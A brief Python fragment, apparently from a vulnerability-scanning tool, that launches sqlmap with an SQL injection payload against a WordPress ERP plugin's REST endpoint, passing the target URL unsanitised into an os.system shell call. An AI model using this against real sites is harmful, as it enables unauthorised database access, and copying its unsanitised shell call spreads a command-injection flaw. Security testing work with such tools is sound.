            ...
            if not self.batch:
                ...
                if choose == "y":
                    ...
                    try:
                        ...
                        os.system(f"cd cve/VulsScan/sqlmap/ && python sqlmap.py -u \"{url}/wp-json/erp/v1/accounting/v1/people?type=customer\') AND (SELECT 1 FROM (SELECT *)x) AND (\'x\'=\'x\" --output-dir={dir}/result/ --batch")
